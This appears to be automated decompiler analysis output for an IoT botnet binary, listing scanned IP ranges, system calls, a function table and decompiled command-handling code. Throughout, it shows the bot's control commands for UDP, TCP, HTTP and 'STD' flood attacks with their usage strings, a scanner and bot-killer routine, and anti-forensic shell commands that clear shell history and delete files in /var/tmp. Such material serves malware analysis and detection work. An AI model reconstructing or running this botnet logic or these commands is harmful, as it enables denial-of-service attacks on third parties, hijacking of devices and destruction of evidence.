        szprintf((int32_t)&v216, (int32_t)"117.181.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"117.178.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"117.177.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"117.176.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"117.170.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"117.171.%d.%d", (int32_t)v213);

        szprintf(v217, (int32_t)"117.162.%d.%d", (int32_t)v213);

        szprintf(v217, (int32_t)"112.26.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"112.27.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"112.28.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"112.29.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"112.30.%d.%d", (int32_t)v213);

        szprintf((int32_t)&v216, (int32_t)"112.31.%d.%d", (int32_t)v213);

        szprintf(v218, (int32_t)"203.150.%d.%d", (int32_t)v213);

    inet_addr((int32_t)"8.8.8.8");

================================================================================
========	SYSTEM CALLS SUMMARY : ================================================
================================================================================
            __libc_system(v215);

            __libc_system(v215);

    __libc_system((int32_t)"history -c;history -w");

    __libc_system((int32_t)"cd /root;rm -rf .bash_history");

    return __libc_system((int32_t)"cd /var/tmp; rm -f *");

int32_t __libc_system(int32_t a1) {

================================================================================
========	FUNCTIONS LIST : =======================================================
================================================================================
FUNCTION_NAME                                     |ARGS|LENGH   |SUSPCET_INSTRC|WHILE_INSTRC|
----------------------------------------------------------------------------------------------
processCmd                                        |2   |5562    |542           |691         |
----------------------------------------------------------------------------------------------
GetRandomPublicIP                                 |1   |1465    |214           |0           |
----------------------------------------------------------------------------------------------
main                                              |0   |853     |87            |483         |
----------------------------------------------------------------------------------------------
gethostbyname_r                                   |6   |1091    |70            |175         |
----------------------------------------------------------------------------------------------
__dns_lookup                                      |6   |980     |65            |627         |
----------------------------------------------------------------------------------------------
_fpmaxtostr                                       |4   |3986    |55            |3683        |
----------------------------------------------------------------------------------------------
fdpopen                                           |2   |528     |38            |0           |
----------------------------------------------------------------------------------------------
sendTCP                                           |7   |471     |33            |130         |
----------------------------------------------------------------------------------------------
prints                                            |4   |651     |30            |33          |
----------------------------------------------------------------------------------------------
sendUDP                                           |7   |426     |26            |97          |
----------------------------------------------------------------------------------------------
__read_etc_hosts_r                                |9   |675     |25            |271         |
----------------------------------------------------------------------------------------------
_ppfs_parsespec                                   |2   |1065    |19            |822         |
----------------------------------------------------------------------------------------------
getOurIP                                          |0   |360     |17            |107         |
----------------------------------------------------------------------------------------------
sleep                                             |1   |521     |14            |0           |
----------------------------------------------------------------------------------------------
_stdio_fopen                                      |2   |800     |13            |0           |
----------------------------------------------------------------------------------------------
__open_nameservers                                |0   |440     |13            |198         |
----------------------------------------------------------------------------------------------
_init                                             |0   |364     |12            |0           |
----------------------------------------------------------------------------------------------
print                                             |3   |555     |11            |315         |
----------------------------------------------------------------------------------------------
StartTheLelz                                      |2   |415     |11            |157         |
----------------------------------------------------------------------------------------------
__heap_free                                       |3   |348     |10            |12          |
----------------------------------------------------------------------------------------------
getBogos                                          |1   |284     |9             |64          |
----------------------------------------------------------------------------------------------
__uClibc_main                                     |6   |394     |9             |18          |
----------------------------------------------------------------------------------------------
__GI_inet_ntop                                    |4   |593     |9             |216         |
----------------------------------------------------------------------------------------------
inet_pton                                         |3   |621     |9             |269         |
----------------------------------------------------------------------------------------------
printi                                            |7   |328     |8             |18          |
----------------------------------------------------------------------------------------------
sendHTTP                                          |6   |283     |8             |50          |
----------------------------------------------------------------------------------------------
sendCNC                                           |3   |242     |7             |0           |
----------------------------------------------------------------------------------------------
negotiate                                         |4   |269     |7             |0           |
----------------------------------------------------------------------------------------------
sendSTD                                           |3   |253     |7             |23          |
----------------------------------------------------------------------------------------------
recvLine                                          |4   |352     |7             |105         |
----------------------------------------------------------------------------------------------
sendHTTP2                                         |6   |283     |7             |53          |
----------------------------------------------------------------------------------------------
fdpclose                                          |1   |268     |6             |23          |
----------------------------------------------------------------------------------------------
getCores                                          |0   |240     |6             |19          |
----------------------------------------------------------------------------------------------
readUntil                                         |7   |328     |5             |99          |
----------------------------------------------------------------------------------------------
strstr                                            |3   |352     |5             |115         |
----------------------------------------------------------------------------------------------
srandom_r                                         |0   |305     |5             |41          |
----------------------------------------------------------------------------------------------
fflush_unlocked                                   |2   |340     |5             |62          |
----------------------------------------------------------------------------------------------
__GI_memchr                                       |3   |340     |4             |89          |
----------------------------------------------------------------------------------------------
socket_connect                                    |2   |252     |4             |0           |
----------------------------------------------------------------------------------------------
_vfprintf_internal                                |0   |929     |4             |687         |
----------------------------------------------------------------------------------------------
connectTimeout                                    |5   |284     |4             |31          |
----------------------------------------------------------------------------------------------
getcwd                                            |2   |386     |4             |0           |
----------------------------------------------------------------------------------------------
listFork                                          |0   |247     |3             |20          |
----------------------------------------------------------------------------------------------
realloc                                           |1   |284     |3             |0           |
----------------------------------------------------------------------------------------------
_stdlib_strto_l                                   |1   |489     |3             |269         |
----------------------------------------------------------------------------------------------
__GI_strncat                                      |4   |310     |3             |62          |
----------------------------------------------------------------------------------------------
__GI_fclose                                       |1   |264     |3             |0           |
----------------------------------------------------------------------------------------------
strncpy                                           |3   |325     |3             |82          |
----------------------------------------------------------------------------------------------
strnlen                                           |1   |320     |3             |67          |
----------------------------------------------------------------------------------------------
sockprintf                                        |3   |224     |3             |0           |
----------------------------------------------------------------------------------------------
botkiller                                         |1   |237     |3             |18          |
----------------------------------------------------------------------------------------------
ClearHistory                                      |0   |219     |3             |0           |
----------------------------------------------------------------------------------------------
initConnection                                    |0   |254     |3             |0           |
----------------------------------------------------------------------------------------------
__GI_strpbrk                                      |2   |254     |2             |30          |
----------------------------------------------------------------------------------------------
__libc_system                                     |1   |259     |2             |0           |
----------------------------------------------------------------------------------------------
_uintmaxtostr                                     |5   |334     |2             |52          |
----------------------------------------------------------------------------------------------
inet_aton                                         |1   |305     |2             |73          |
----------------------------------------------------------------------------------------------
_stdio_term                                       |2   |268     |2             |30          |
----------------------------------------------------------------------------------------------
__GI_initstate_r                                  |4   |247     |2             |0           |
----------------------------------------------------------------------------------------------
trim                                              |1   |279     |2             |60          |
----------------------------------------------------------------------------------------------
execl                                             |5   |286     |2             |53          |
----------------------------------------------------------------------------------------------
read_with_timeout                                 |4   |240     |2             |17          |
----------------------------------------------------------------------------------------------
_stdio_openlist_dec_use                           |0   |281     |2             |28          |
----------------------------------------------------------------------------------------------
__open_etc_hosts                                  |0   |226     |2             |0           |
----------------------------------------------------------------------------------------------
__GI_strlen                                       |0   |301     |2             |24          |
----------------------------------------------------------------------------------------------
contains_string                                   |2   |250     |2             |17          |
----------------------------------------------------------------------------------------------
matchPrompt                                       |1   |286     |2             |61          |
----------------------------------------------------------------------------------------------
__GI_strchr                                       |2   |326     |2             |27          |
----------------------------------------------------------------------------------------------
__GI_fgets_unlocked                               |3   |317     |2             |69          |
----------------------------------------------------------------------------------------------
__stdio_WRITE                                     |2   |314     |2             |85          |
----------------------------------------------------------------------------------------------
memrchr                                           |4   |340     |2             |84          |
----------------------------------------------------------------------------------------------
abort                                             |1   |335     |2             |0           |
----------------------------------------------------------------------------------------------
getdtablesize                                     |1   |224     |1             |0           |
----------------------------------------------------------------------------------------------
_ppfs_setargs                                     |0   |405     |1             |115         |
----------------------------------------------------------------------------------------------
__heap_alloc                                      |2   |282     |1             |46          |
----------------------------------------------------------------------------------------------
__GI_strcasecmp                                   |2   |257     |1             |36          |
----------------------------------------------------------------------------------------------
__raise                                           |1   |217     |1             |0           |
----------------------------------------------------------------------------------------------
get_telstate_host                                 |2   |217     |1             |0           |
----------------------------------------------------------------------------------------------
getHost                                           |3   |218     |1             |0           |
----------------------------------------------------------------------------------------------
__GI_setsockopt                                   |5   |216     |1             |0           |
----------------------------------------------------------------------------------------------
rand                                              |0   |217     |1             |0           |
----------------------------------------------------------------------------------------------
__xpg_strerror_r                                  |0   |308     |1             |4           |
----------------------------------------------------------------------------------------------
__GI_inet_ntoa                                    |2   |217     |1             |0           |
----------------------------------------------------------------------------------------------
makeIPPacket                                      |6   |219     |1             |0           |
----------------------------------------------------------------------------------------------
inet_pton4                                        |2   |286     |1             |61          |
----------------------------------------------------------------------------------------------
__libc_sendto                                     |7   |216     |1             |0           |
----------------------------------------------------------------------------------------------
fgets                                             |3   |232     |1             |0           |
----------------------------------------------------------------------------------------------
_charpad                                          |3   |243     |1             |17          |
----------------------------------------------------------------------------------------------
__heap_alloc_at                                   |3   |270     |1             |45          |
----------------------------------------------------------------------------------------------
ioctl                                             |3   |292     |1             |0           |
----------------------------------------------------------------------------------------------
__decode_dotted                                   |2   |315     |1             |66          |
----------------------------------------------------------------------------------------------
__GI_strcoll                                      |2   |239     |1             |17          |
----------------------------------------------------------------------------------------------
makeRandomStr                                     |2   |228     |1             |0           |
----------------------------------------------------------------------------------------------
parseHex                                          |1   |244     |1             |18          |
----------------------------------------------------------------------------------------------
__encode_dotted                                   |1   |298     |1             |52          |
----------------------------------------------------------------------------------------------
memcpy                                            |0   |408     |1             |91          |
----------------------------------------------------------------------------------------------
isatty                                            |1   |218     |1             |0           |
----------------------------------------------------------------------------------------------
tcpcsum                                           |3   |222     |1             |0           |
----------------------------------------------------------------------------------------------
szprintf                                          |3   |217     |1             |0           |
----------------------------------------------------------------------------------------------
__get_hosts_byname_r                              |7   |219     |1             |0           |
----------------------------------------------------------------------------------------------
__libc_recv                                       |4   |216     |1             |0           |
----------------------------------------------------------------------------------------------
sprintf                                           |8   |219     |1             |0           |
----------------------------------------------------------------------------------------------
__length_dotted                                   |0   |244     |1             |17          |
----------------------------------------------------------------------------------------------
inet_addr                                         |1   |224     |1             |0           |
----------------------------------------------------------------------------------------------
__GI_wcsnrtombs                                   |0   |322     |1             |37          |
----------------------------------------------------------------------------------------------
random                                            |0   |222     |1             |0           |
----------------------------------------------------------------------------------------------
getsockopt                                        |5   |216     |1             |0           |
----------------------------------------------------------------------------------------------
zprintf                                           |2   |217     |1             |0           |
----------------------------------------------------------------------------------------------
strcasestr                                        |3   |247     |1             |28          |
----------------------------------------------------------------------------------------------
__libc_creat                                      |1   |217     |1             |0           |
----------------------------------------------------------------------------------------------
GetRandomIP                                       |1   |218     |1             |0           |
----------------------------------------------------------------------------------------------
__check_one_fd                                    |2   |231     |1             |0           |
----------------------------------------------------------------------------------------------
sclose                                            |1   |224     |1             |0           |
----------------------------------------------------------------------------------------------
srand                                             |1   |220     |1             |0           |
----------------------------------------------------------------------------------------------
__libc_connect                                    |3   |216     |1             |0           |
----------------------------------------------------------------------------------------------
malloc                                            |0   |300     |1             |0           |
----------------------------------------------------------------------------------------------
__GI_gethostbyname                                |1   |219     |1             |0           |
----------------------------------------------------------------------------------------------
__GI_strspn                                       |1   |252     |1             |26          |
----------------------------------------------------------------------------------------------
__GI_inet_ntoa_r                                  |2   |239     |1             |20          |
----------------------------------------------------------------------------------------------
__libc_send                                       |4   |216     |1             |0           |
----------------------------------------------------------------------------------------------
__libc_waitpid                                    |3   |217     |1             |0           |
----------------------------------------------------------------------------------------------
__GI_vsnprintf                                    |0   |231     |1             |0           |
----------------------------------------------------------------------------------------------
_ppfs_init                                        |1   |264     |1             |35          |
----------------------------------------------------------------------------------------------
fdgets                                            |3   |242     |1             |21          |
----------------------------------------------------------------------------------------------
__GI__exit                                        |1   |227     |1             |9           |
----------------------------------------------------------------------------------------------
advance_state                                     |2   |224     |1             |0           |
----------------------------------------------------------------------------------------------
getBuild                                          |1   |217     |1             |0           |
----------------------------------------------------------------------------------------------
inet_ntop4                                        |3   |268     |1             |44          |
----------------------------------------------------------------------------------------------
free                                              |0   |271     |1             |0           |
----------------------------------------------------------------------------------------------
socket                                            |3   |216     |1             |0           |
----------------------------------------------------------------------------------------------
__GI_fopen                                        |2   |217     |1             |0           |
----------------------------------------------------------------------------------------------
__GI_getsockname                                  |4   |216     |1             |0           |
----------------------------------------------------------------------------------------------
rawmemchr                                         |3   |300     |1             |10          |
----------------------------------------------------------------------------------------------
strcpy                                            |2   |230     |0             |0           |
----------------------------------------------------------------------------------------------
memmove                                           |2   |480     |0             |0           |
----------------------------------------------------------------------------------------------
__heap_link_free_area_after                       |4   |223     |0             |0           |
----------------------------------------------------------------------------------------------
getegid                                           |0   |227     |0             |0           |
----------------------------------------------------------------------------------------------
__syscall_error                                   |0   |218     |0             |0           |
----------------------------------------------------------------------------------------------
kill                                              |2   |227     |0             |0           |
----------------------------------------------------------------------------------------------
__stdio_READ                                      |3   |253     |0             |0           |
----------------------------------------------------------------------------------------------
_fini                                             |0   |217     |0             |0           |
----------------------------------------------------------------------------------------------
__libc_nanosleep                                  |2   |227     |0             |0           |
----------------------------------------------------------------------------------------------
htons                                             |1   |218     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_strtok                                       |3   |217     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_setsid                                       |0   |227     |0             |0           |
----------------------------------------------------------------------------------------------
__libc_sigaction                                  |3   |234     |0             |0           |
----------------------------------------------------------------------------------------------
__stdio_seek                                      |3   |228     |0             |0           |
----------------------------------------------------------------------------------------------
geteuid                                           |0   |227     |0             |0           |
----------------------------------------------------------------------------------------------
__socketcall                                      |2   |227     |0             |0           |
----------------------------------------------------------------------------------------------
__vfork                                           |0   |220     |0             |0           |
----------------------------------------------------------------------------------------------
__pthread_return_0                                |0   |217     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_toupper                                      |2   |220     |0             |0           |
----------------------------------------------------------------------------------------------
sigemptyset                                       |1   |218     |0             |0           |
----------------------------------------------------------------------------------------------
atol                                              |2   |217     |0             |0           |
----------------------------------------------------------------------------------------------
setstate                                          |1   |228     |0             |0           |
----------------------------------------------------------------------------------------------
__libc_getpid                                     |0   |227     |0             |0           |
----------------------------------------------------------------------------------------------
__libc_read                                       |1   |227     |0             |0           |
----------------------------------------------------------------------------------------------
contains_success                                  |1   |217     |0             |0           |
----------------------------------------------------------------------------------------------
read_until_response                               |6   |225     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_fwrite_unlocked                              |4   |277     |0             |0           |
----------------------------------------------------------------------------------------------
__stdio_trans2w_o                                 |1   |384     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_brk                                          |1   |218     |0             |0           |
----------------------------------------------------------------------------------------------
__do_global_ctors_aux                             |1   |233     |0             |0           |
----------------------------------------------------------------------------------------------
getrlimit                                         |2   |227     |0             |0           |
----------------------------------------------------------------------------------------------
contains_fail                                     |1   |217     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_fseeko64                                     |3   |297     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_fputs_unlocked                               |2   |225     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_tcsetattr                                    |0   |346     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_mempcpy                                      |7   |218     |0             |0           |
----------------------------------------------------------------------------------------------
__decode_header                                   |2   |227     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_getpagesize                                  |0   |219     |0             |0           |
----------------------------------------------------------------------------------------------
init_rand                                         |1   |221     |0             |0           |
----------------------------------------------------------------------------------------------
_promoted_size                                    |1   |227     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_exit                                         |0   |226     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_sbrk                                         |1   |269     |0             |0           |
----------------------------------------------------------------------------------------------
__bsd_signal                                      |2   |280     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_tcgetattr                                    |1   |232     |0             |0           |
----------------------------------------------------------------------------------------------
ntohs                                             |0   |218     |0             |0           |
----------------------------------------------------------------------------------------------
uppercase                                         |1   |236     |0             |0           |
----------------------------------------------------------------------------------------------
_fp_out_narrow                                    |4   |270     |0             |0           |
----------------------------------------------------------------------------------------------
_stdio_init                                       |1   |221     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_wcrtomb                                      |3   |229     |0             |0           |
----------------------------------------------------------------------------------------------
_store_inttype                                    |1   |239     |0             |0           |
----------------------------------------------------------------------------------------------
_ppfs_prepargs                                    |2   |227     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_fseek                                        |1   |218     |0             |0           |
----------------------------------------------------------------------------------------------
__GI___h_errno_location                           |0   |217     |0             |0           |
----------------------------------------------------------------------------------------------
__sigismember                                     |2   |219     |0             |0           |
----------------------------------------------------------------------------------------------
unknown_0                                         |2   |0       |0             |0           |
----------------------------------------------------------------------------------------------
call_frame_dummy                                  |0   |218     |0             |0           |
----------------------------------------------------------------------------------------------
__libc_fcntl                                      |2   |237     |0             |0           |
----------------------------------------------------------------------------------------------
setstate_r                                        |2   |249     |0             |0           |
----------------------------------------------------------------------------------------------
getc_unlocked                                     |2   |360     |0             |0           |
----------------------------------------------------------------------------------------------
strtok_r                                          |1   |241     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_memset                                       |3   |375     |0             |0           |
----------------------------------------------------------------------------------------------
__encode_header                                   |3   |232     |0             |0           |
----------------------------------------------------------------------------------------------
__length_question                                 |2   |226     |0             |0           |
----------------------------------------------------------------------------------------------
initstate                                         |3   |221     |0             |0           |
----------------------------------------------------------------------------------------------
feof                                              |1   |241     |0             |0           |
----------------------------------------------------------------------------------------------
bcopy                                             |4   |217     |0             |0           |
----------------------------------------------------------------------------------------------
wait4                                             |1   |227     |0             |0           |
----------------------------------------------------------------------------------------------
csum                                              |5   |368     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_time                                         |1   |227     |0             |0           |
----------------------------------------------------------------------------------------------
__libc_fork                                       |0   |227     |0             |0           |
----------------------------------------------------------------------------------------------
__libc_open                                       |2   |234     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_sigaddset                                    |2   |229     |0             |0           |
----------------------------------------------------------------------------------------------
__heap_link_free_area                             |4   |225     |0             |0           |
----------------------------------------------------------------------------------------------
__stdio_init_mutex                                |0   |217     |0             |0           |
----------------------------------------------------------------------------------------------
isspace                                           |2   |218     |0             |0           |
----------------------------------------------------------------------------------------------
__GI___uClibc_init                                |1   |230     |0             |0           |
----------------------------------------------------------------------------------------------
__libc_select                                     |5   |227     |0             |0           |
----------------------------------------------------------------------------------------------
__stdio_fwrite                                    |3   |296     |0             |0           |
----------------------------------------------------------------------------------------------
__decode_answer                                   |4   |248     |0             |0           |
----------------------------------------------------------------------------------------------
contains_response                                 |1   |223     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_fputs                                        |2   |232     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_fcntl64                                      |1   |230     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_random_r                                     |2   |252     |0             |0           |
----------------------------------------------------------------------------------------------
call___do_global_dtors_aux                        |0   |218     |0             |0           |
----------------------------------------------------------------------------------------------
rand_cmwc                                         |0   |236     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_pipe                                         |2   |227     |0             |0           |
----------------------------------------------------------------------------------------------
__stdio_adjust_position                           |2   |501     |0             |0           |
----------------------------------------------------------------------------------------------
getgid                                            |1   |227     |0             |0           |
----------------------------------------------------------------------------------------------
getuid                                            |1   |227     |0             |0           |
----------------------------------------------------------------------------------------------
__GI___uClibc_fini                                |1   |233     |0             |0           |
----------------------------------------------------------------------------------------------
ntohl                                             |2   |218     |0             |0           |
----------------------------------------------------------------------------------------------
__syscall_rt_sigaction                            |0   |227     |0             |0           |
----------------------------------------------------------------------------------------------
strtol                                            |2   |217     |0             |0           |
----------------------------------------------------------------------------------------------
frame_dummy                                       |0   |222     |0             |0           |
----------------------------------------------------------------------------------------------
__libc_close                                      |1   |227     |0             |0           |
----------------------------------------------------------------------------------------------
chdir                                             |2   |227     |0             |0           |
----------------------------------------------------------------------------------------------
dup2                                              |3   |227     |0             |0           |
----------------------------------------------------------------------------------------------
__sigaddset                                       |0   |222     |0             |0           |
----------------------------------------------------------------------------------------------
__errno_location                                  |0   |217     |0             |0           |
----------------------------------------------------------------------------------------------
__libc_write                                      |2   |227     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_execve                                       |2   |227     |0             |0           |
----------------------------------------------------------------------------------------------
__encode_question                                 |3   |234     |0             |0           |
----------------------------------------------------------------------------------------------
__pthread_return_void                             |0   |218     |0             |0           |
----------------------------------------------------------------------------------------------
call___do_global_ctors_aux                        |0   |218     |0             |0           |
----------------------------------------------------------------------------------------------
usleep                                            |2   |217     |0             |0           |
----------------------------------------------------------------------------------------------
printchar                                         |2   |229     |0             |0           |
----------------------------------------------------------------------------------------------
__stdio_trans2r_o                                 |2   |288     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_sigprocmask                                  |3   |252     |0             |0           |
----------------------------------------------------------------------------------------------
reset_telstate                                    |2   |217     |0             |0           |
----------------------------------------------------------------------------------------------
__stdio_wcommit                                   |0   |230     |0             |0           |
----------------------------------------------------------------------------------------------
__do_global_dtors_aux                             |0   |243     |0             |0           |
----------------------------------------------------------------------------------------------
strcat                                            |2   |237     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_strdup                                       |1   |227     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_wcsrtombs                                    |0   |217     |0             |0           |
----------------------------------------------------------------------------------------------
_load_inttype                                     |2   |259     |0             |0           |
----------------------------------------------------------------------------------------------
_start                                            |2   |223     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_tolower                                      |1   |220     |0             |0           |
----------------------------------------------------------------------------------------------
wildString                                        |3   |281     |0             |0           |
----------------------------------------------------------------------------------------------
_dl_aux_init                                      |1   |219     |0             |0           |
----------------------------------------------------------------------------------------------
__sigdelset                                       |2   |221     |0             |0           |
----------------------------------------------------------------------------------------------
__libc_lseek64                                    |4   |234     |0             |0           |
----------------------------------------------------------------------------------------------
__libc_poll                                       |3   |227     |0             |0           |
----------------------------------------------------------------------------------------------
htonl                                             |1   |218     |0             |0           |
----------------------------------------------------------------------------------------------
__GI___glibc_strerror_r                           |3   |219     |0             |0           |
----------------------------------------------------------------------------------------------
__stdio_rfill                                     |2   |220     |0             |0           |
----------------------------------------------------------------------------------------------
prctl                                             |6   |227     |0             |0           |
----------------------------------------------------------------------------------------------
================================================================================
========	FUNCTIONS SUSPECTED INSTRUNCTIONS : ===================================
================================================================================
=================FUNCTION : processCmd ===================
++++++++ FUNCTION START 17494
++++++++ FUNCTION END 23056
++++++++ FUNCTION LENGTH 5562
    if (__GI_strcoll((char *)*a2, (int32_t)"PING") == 0) {
        sockprintf(v209, (int32_t)"PONG!", 0x10010000);
            sockprintf(v209, (int32_t)"%d", getdtablesize(0x10030000));
                    kill(v282, 9);
                    sockprintf(v209, (int32_t)"STOPPING SCANNER", 0x10010000);
                        int32_t v283 = __libc_fork(); // 0x1000a438
                            int32_t v284 = __GI_inet_ntoa(&v216, 0x10030000); // 0x1000a49c
                            sockprintf(v215, (int32_t)"STARTING SCANNER ON -> %s", v284);
                                if (listFork() == 0) {
                                    v275 = __GI_inet_ntoa(&v216, 0x10030000);
                                    v279 = sockprintf(v215, (int32_t)"COMMENCING BOT KILL ON -> %s", v275);
                                    botkiller(v279);
                            if (__GI_strcoll((char *)*a2, (int32_t)"GETPUBLICIP") == 0) {
                                v276 = __GI_inet_ntoa(&v216, 0x10030000);
                                sockprintf(v215, (int32_t)"My Public IP: %s", v276);
                                if (__GI_strcoll((char *)*a2, (int32_t)"UDP") == 0) {
                                                                            return sockprintf(v209, (int32_t)"UDP <target> <port (0 for random)> <time> <netmask> <packet size> <poll interval> <sleep check> <sleep time(ms)>", 0x10010000);
                                                                                if (listFork() == 0) {
                                                                                    sendUDP(v247, v248, v249, v250, v251, v217, v223);
                                                                                    if (__GI_strcoll((char *)*a2, (int32_t)"TCP") == 0) {
                                                                                                                    result = sockprintf(v209, (int32_t)"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)", 0x10010000);
                                                                                                                    result = sockprintf(v209, (int32_t)"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)", 0x10010000);
                                                                                                                if (listFork() == 0) {
                                                                                                                    sendTCP(v259, v260, v261, v262, v263, v221, v222);
                                                                                                                    while (true) {
                                                                                                                        if (listFork() == 0) {
                                                                                                                            sendTCP(v219, v260, v261, v262, v263, v221, v222);
                                                                                                                    if (__GI_strcoll((char *)*a2, (int32_t)"HTTP") == 0) {
                                                                                                                                if (listFork() == 0) {
                                                                                                                                    sendHTTP(v215, v214, (int16_t)(v267 % 0x10000), v213, v212, v270);
                                                                                                                                    if (__GI_strcoll((char *)*a2, (int32_t)"HTTPFLOOD") == 0) {
                                                                                                                                                    if (listFork() == 0) {
                                                                                                                                                        sendHTTP2(v271, v214, (int16_t)(v272 % 0x10000), v213, v212, v274);
                                                                                                                                                                                v307 = listFork();
                                                                                                                                                                                    sendSTD(v300, v301, v302);
                                                                                                                                                                                    if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                                                                                                        while (true) {
                                                                                                                                                                                while (true) {
                                                                                                                                                                                    if (listFork() == 0) {
                                                                                                                                                                            if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                                                                                                while (true) {
                                                                                                                                                                result2 = sockprintf(v209, (int32_t)"STD <target> <port> <time>", 0x10010000);
                                                                                                                                                                if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                                                                                    while (true) {
                                                                                                                                                                        result3 = listFork();
                                                                                                                                                                        sendCNC(v290, v291, v292);
                                                                                                                                                                                            v307 = listFork();
                                                                                                                                                                                                sendSTD(v300, v301, v302);
                                                                                                                                                                                                if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                                                                                                                    while (true) {
                                                                                                                                                                                                                    sockprintf(v209, (int32_t)"None Killed.", 0x10010000);
                                                                                                                                                                                                                    sockprintf(v209, (int32_t)"Killed %d.", v305);
                                                                                                                                                                                                            if (*v310 != __libc_getpid()) {
                                                                                                                                                                                                                kill(v312, 9);
                                                                                                                                                                                            while (true) {
                                                                                                                                                                                                if (listFork() == 0) {
                                                                                                                                                                                                    sendSTD(v295, v301, v302);
                                                                                                                                                                                            if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                                                                                                                while (true) {
                                                                                                                                                                                        if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                                                                                                            while (true) {
                                                                                                                                                                            result2 = sockprintf(v209, (int32_t)"STD <target> <port> <time>", 0x10010000);
                                                                                                                                                                            if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                                                                                                while (true) {
                                                                                                                                                                        while (true) {
                                                                                                                                                                            if (listFork() == 0) {
                                                                                                                                                                                sendCNC(v285, v291, v292);
                                                                                                                                                                                __libc_close(v209);
                                                                                                                                                                                            v307 = listFork();
                                                                                                                                                                                                sendSTD(v300, v301, v302);
                                                                                                                                                                                                if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                                                                                                                    while (true) {
                                                                                                                                                                                            while (true) {
                                                                                                                                                                                                if (listFork() == 0) {
                                                                                                                                                                                        if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                                                                                                            while (true) {
                                                                                                                                                                            result2 = sockprintf(v209, (int32_t)"STD <target> <port> <time>", 0x10010000);
                                                                                                                                                                            if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                                                                                                while (true) {
                                                                                                                                                                                        v307 = listFork();
                                                                                                                                                                                            sendSTD(v300, v301, v302);
                                                                                                                                                                                            if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                                                                                                                while (true) {
                                                                                                                                                                                        while (true) {
                                                                                                                                                                                            if (listFork() == 0) {
                                                                                                                                                                                    if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                                                                                                        while (true) {
                                                                                                                                                                        result2 = sockprintf(v209, (int32_t)"STD <target> <port> <time>", 0x10010000);
                                                                                                                                                                        if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                                                                                            while (true) {
                                                                                                                                                        return sockprintf(v209, (int32_t)"CNC <target> <port> <time>", 0x10010000);
                                                                                                                                                            result3 = listFork();
                                                                                                                                                            sendCNC(v290, v291, v292);
                                                                                                                                                                                v307 = listFork();
                                                                                                                                                                                    sendSTD(v300, v301, v302);
                                                                                                                                                                                    if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                                                                                                        while (true) {
                                                                                                                                                                                while (true) {
                                                                                                                                                                                    if (listFork() == 0) {
                                                                                                                                                                            if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                                                                                                while (true) {
                                                                                                                                                                result2 = sockprintf(v209, (int32_t)"STD <target> <port> <time>", 0x10010000);
                                                                                                                                                                if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                                                                                    while (true) {
                                                                                                                                                            while (true) {
                                                                                                                                                                if (listFork() == 0) {
                                                                                                                                                                            if (listFork() == 0) {
                                                                                                                                                                                sendSTD(v300, v301, v302);
                                                                                                                                                                                if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                                                                                                    while (true) {
                                                                                                                                                                                while (true) {
                                                                                                                                                                                    if (listFork() == 0) {
